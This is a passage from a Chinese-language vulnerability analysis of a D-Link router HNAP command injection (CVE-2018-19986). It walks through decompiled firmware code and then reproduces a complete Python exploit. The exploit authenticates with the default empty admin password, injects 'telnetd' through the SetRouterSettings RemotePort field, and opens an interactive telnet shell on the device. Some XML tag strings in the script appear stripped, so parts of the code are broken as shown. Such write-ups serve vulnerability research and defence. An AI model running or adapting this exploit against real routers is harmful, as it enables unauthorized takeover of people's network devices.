                    if (__fd == 0) {
                      ……
                      //如果不是Logout，就跳转到0x413330
                      __format = strstr(soapaction,"http://purenetworks.com/HNAP1/Logout");
                      if (__format == (char *)0x0) goto LAB_00413330;
                      ……
              }
         }//end of soapaction!=0
        LAB_00413330:
           //在soapaction中查找最后一个“/”之后的内容为operation
           __format = strrchr(soapaction,0x2f);
           operation = __format + 1;
           if (__format != (char *)0x0) {
             sVar3 = strlen(operation);
             if (operation[sVar3 - 1] == '\"') {
               operation[sVar3 - 1] = 0;
             }
             //hnap相关的php都在/etc/templates/hnap下
             snprintf(php_path,0x100,"%s/%s.php","/etc/templates/hnap/",operation);
             //判断与请求相关的php是否存在，0为存在
             iVar1 = access(php_path,0);
             if (iVar1 == 0) {
                ……
                snprintf(acStack1708,0x100,"%s%s.php\nShellPath=%s%s.sh\nPrivateKey=%s\n",
                     "/etc/templates/hnap/",operation,&var_run,operation,&DAT_00438344);
                sobj_add_string(iVar4,acStack1708);
                 ……
                uVar2 = sobj_get_string();
                //该函数会建立一个socket并把上面的acStack1708字符发送给socket；这个socket是与本地的xmldb_sock建立的，理解为发送给本地以执行对应的php
                xmldbc_ephp(0,0,uVar2,stdout);
                ……
                snprintf(acStack1708,0x100,"%s",operation);
                iVar4 = FUN_004125c8(acStack1708,"/etc/templates/hnap//.shell_action");
                //这里无论如何都会为format赋值，内容是执行一个sh脚本的命令
                if (iVar4 == 0) {
                  __format = "sh %s%s.sh > /dev/console";
                }
                else {
                  __format = "sh %s%s.sh > /dev/console &";
                }
                //执行该脚本
                //var_run变量对应的字符是"/var/run/"
                snprintf(acStack1708,0x100,__format,&var_run,operation);
                system(acStack1708);
                ……
    }
### 漏洞执行顺序
在上面的hnap_main代码中，代入本漏洞SetRouterSettings的情况，最后会执行`sh
/var/run/SetRouterSettings.sh`，这个脚本是动态生成的，在模拟固件并执行poc成功之后查看内容（还没找到具体生成sh脚本的代码）
    #!/bin/sh
    echo "[$0]-->RouterSettings Change" > /dev/console
    event DBSAVE > /dev/console
    service HTTP.WAN-1 start > /dev/console #here！！！
    xmldbc -s /runtime/hnap/dev_status '' > /dev/console
HTTP.WAN-1是一种服务，对应于/etc/services/HTTP.WAN-1.php，该服务会开启IPT.WAN-1服务
/etc/services/IPT.WAN-1.php会执行之前所说的iptables命令
## 漏洞利用
利用脚本是漏洞原作者写好的[exp](https://github.com/pr0v3rbs/CVE/tree/master/CVE-2018-19986%20-%2019990)
    import requests
    import telnetlib
    from hashlib import md5
    import time
    import math
    trans_5C = "".join(chr(x ^ 0x5c) for x in xrange(256))
    trans_36 = "".join(chr(x ^ 0x36) for x in xrange(256))
    blocksize = md5().block_size
    def hmac_md5(key, msg):
        if len(key) > blocksize:
            key = md5(key).digest()
        key += chr(0) * (blocksize - len(key))
        o_key_pad = key.translate(trans_5C)
        i_key_pad = key.translate(trans_36)
        return md5(o_key_pad + md5(i_key_pad + msg).digest())
    def HNAP_AUTH(SOAPAction, privateKey):
        b = math.floor(int(time.time())) % 2000000000
        b = str(b)[:-2]
        h = hmac_md5(privateKey, b + '"http://purenetworks.com/HNAP1/' + SOAPAction + '"').hexdigest().upper()
        return h + " " + b
    #输入IP和admin口令，通过读hnap_main的二进制，理解初始状态admin的口令为空（public_key_0：0代表空值）
    IP = '192.168.0.1'
    adminPw = ''
    command = "telnetd" # command injection id
    headers = requests.utils.default_headers()
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"
    headers["SOAPAction"] = '"http://purenetworks.com/HNAP1/Login"'
    headers["Origin"] = "http://" + IP
    headers["Referer"] = "http://" + IP + "/info/Login.html"
    headers["Content-Type"] = "text/xml; charset=UTF-8"
    headers["X-Requested-With"] = "XMLHttpRequest"
    #构造一个action为request的请求发送给Login
    payload = 'requestAdmin'
    r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload)
    data = r.text
    #通过获取的publickey计算privatekey，根据privatekey计算口令的hmac(在上文中对应的是hmac_1)
    challenge = str(data[data.find("") + 11: data.find("")])
    cookie = data[data.find("") + 8: data.find("")]
    publicKey = str(data[data.find("") + 11: data.find("")])
    privateKey = hmac_md5(publicKey + adminPw, challenge).hexdigest().upper()
    password = hmac_md5(privateKey, challenge).hexdigest().upper()
    #构造action为login的请求，发送用户名和口令
    headers["HNAP_AUTH"] = HNAP_AUTH("Login", privateKey)
    headers["Cookie"] = "uid=" + cookie
    payload = 'loginAdmin'+password+''
    r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload)
    #登录成功后访问SetRouterSettings设置路由器的一些配置，其中RemotePort被设置为command
    headers["Origin"] = "http://" + IP
    headers["HNAP_AUTH"] = HNAP_AUTH("SetRouterSettings", privateKey)
    headers["SOAPaction"] = '"http://purenetworks.com/HNAP1/SetRouterSettings"'
    headers["Accept"] = "text/xml"
    payload = open('{}.xml'.format("CVE-2018-19986")).read().replace('ip', IP).replace('COMMAND', command)
    print '[*] command injection'
    r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload)
    print(r.text)
    print '[*] waiting 30 sec...'
    time.sleep(30)
    #利用成功之后，服务端已经开启了Telnet服务，攻击者可直接连服务器的Telnet
    print '[*] enjoy your shell'
    telnetlib.Telnet(IP).interact()
## 参考链接
【1】 
【2】InfoSec Handlers Diary Blog - More on HNAP - What is it, How to Use it, How
to Find it
【3】
【4】Hacking the D-Link DIR-890L – ccSec | 漏洞人生 